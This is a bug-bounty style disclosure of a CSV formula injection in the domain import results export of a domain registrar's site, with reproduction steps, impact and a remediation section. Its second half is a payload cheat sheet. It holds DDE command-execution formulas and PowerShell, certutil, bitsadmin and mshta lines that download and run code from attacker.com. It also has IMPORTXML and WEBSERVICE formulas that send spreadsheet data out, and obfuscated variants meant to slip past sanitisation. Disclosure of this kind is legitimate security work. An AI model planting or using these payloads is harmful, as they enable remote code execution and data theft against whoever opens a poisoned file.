---
title: "Epik: CSV Formula Injection in Domain Import Results (Parking Title field) to RCE"
date: 2026-10-15
categories: [Web, CSV-Injection]
severiry: [P3 - but P2 in old exel version Enable command execution]
tags: [csv-injection, csv, injection, formula, formula-injection, P3, RCE, fixed]
---

## What is CSV / Formula Injection?

**CSV Injection (a beginner’s summary)**

It’s a vulnerability that happens when a website lets you export data to a CSV or Excel file, but doesn’t clean the data first, and one of those values was typed by an attacker. The bug doesn’t fire on the website. It fires when someone opens that file in a spreadsheet program (Excel, LibreOffice, Google Sheets).

#### Why it happens?

Spreadsheets treat any cell that starts with certain characters as a formula, not text:

= + - @

So if a cell contains =1+1, Excel doesn’t show the text “=1+1” — it calculates it and shows 2. That’s the whole idea: the website saved plain text, but the spreadsheet runs it as code.


## Target
 
**Epik** is a US-based domain registrar, a company where people buy, register, and manage domain names, competing with GoDaddy, Namecheap, and similar. It also offers hosting, a marketplace for buying/selling domains, and domain parking services (monetizing unused domains).
 
**Status: Private**: Reported to the program.
 
 
Summary
-------
The domain import functionality on registrar.epik.com allows a user to upload a CSV file containing a malicious formula in the Parking Title field.

When the import is processed (even if the domain is not associated with the account), the application reflects the unsanitized value in the downloadable results CSV (import-result-XXXXX.csv).

When this file is opened in Microsoft Excel, the formula is interpreted and multiple security warnings are triggered (DDE / external links). On older versions of Excel or systems with DDE enabled, this can lead to arbitrary command execution.


Steps to Reproduce
------------------
1. Log in to https://registrar.epik.com
2. Go to the domain import / bulk update feature that accepts a CSV file.
3. Create a CSV file with the following content via Burpsuite:

![import](/epik-import.png)

```
Domain,Parking Title
```
```
test.com,=1+1
```

![import](/epik-burp.png)

#### You can use different payloads:

- =cmd|'/c whoami'!A1 (RCE)
- =cmd|'/C powershell IEX(New-Object Net.WebClient).DownloadString("http://attacker.com/shell.ps1")'!A0 (RCE to attacker domain allow malware download)

4. Upload the CSV.
5. After processing, download the results file (e.g. import-result-94305.csv or “Download All Results” / “Download Domains with Errors”).
   
![import](/epik-download-csv.png)

7. Open the downloaded CSV with Microsoft Excel.
   

![import](/epik-exel.png)

#### Observed Result:
Excel shows the value of 1+1 = 2. The malicious formula is present in the “Parking Title” column.


Proof of Concept
----------------
### Payload used:

```
=1+1
```

### More dangerous variant (for impact demonstration):

```
=cmd|'/c whoami'!A1
```
or this more critical for RCE

```
=cmd|'/C powershell IEX(New-Object Net.WebClient).DownloadString("http://attacker.com/shell.ps1")'!A0
```

Even when the domain is not associated with the account (ERROR: Domain not associated with this Epik account), the formula is still written into the exported CSV without sanitization.


Impact
------
- An attacker can generate a malicious CSV through Epik’s own platform.
- The resulting file can be shared with third parties (partners, buyers, accountants, etc.) via email, messaging apps, or cloud storage.
- Recipients do not need an Epik account or to visit the website, they only need to open the CSV.
- On modern Excel the payload is usually blocked by default (DDE disabled).
- On older Excel versions (2016 and earlier) or systems where DDE is enabled, arbitrary command execution is possible.

Given that Epik is a domain registrar and users frequently share domain-related reports, this increases the realistic attack surface beyond simple self-exploitation.


Recommended Remediation
-----------------------
When generating any CSV export, sanitize cells that begin with the following characters:

- =
- (+)
- (-)
- @

The most common and effective fix is to prefix the value with a single quote ('), forcing Excel to treat it as text.

### Example:
=cmd|...  →  '=cmd|...

# Payload Categories

### Basic DDE Payloads:
```
DDE("cmd";"/C calc";"!A0")
=cmd|' /C calc'!A0
=cmd|' /C notepad'!'A1'
@SUM(1+9)*cmd|' /C calc'!A0
```

### Advanced Command Execution:
```
=cmd|'/c whoami'!A1
=cmd|'/c ipconfig'!A1
=cmd|'/c net user'!A1
=cmd|'/c wmic process call create calc'!A1
```

### Remote Code Execution (RCE):

```
=cmd|'/C powershell IEX(New-Object Net.WebClient).DownloadString("http://attacker.com/shell.ps1")'!A0
=cmd|'/c certutil -urlcache -split -f http://attacker.com/payload.exe C:\temp\payload.exe'!A0
=cmd|'/c bitsadmin /transfer job http://attacker.com/payload.exe C:\temp\payload.exe'!A0
=cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1
=cmd|'/c mshta http://attacker.com/payload.hta'!A0
```

### HYPERLINK Exploitation:

```
=HYPERLINK("http://attacker.com","Click me")
=HYPERLINK("file:///C:/Windows/System32/calc.exe","Click")
@HYPERLINK("http://attacker.com?c=","Click Here")
```

### Data Exfiltration:

```
=IMPORTXML(CONCAT("http://attacker.com/?v=",A1),"//a")
=IMPORTFEED("http://attacker.com/feed.xml")
=WEBSERVICE("http://attacker.com")
```

### Obfuscation Techniques:

```
	=cmd|'/c calc'!A1
	@SUM(1+1)
	=DDE("cmd";"/C calc";"!A0")
'=cmd|'/c calc'!A1
'@SUM(1+1)
'+1+1
%3D1%2B1
%3Dcmd%7C%27%2Fc%20calc%27%21A1
%3DDDE%28%22cmd%22%3B%22%2FC%20calc%22%3B%22%21A0%22%29
%0A=cmd|'/c calc'!A1
%0D=cmd|'/c calc'!A1
%09=cmd|'/c calc'!A1
```
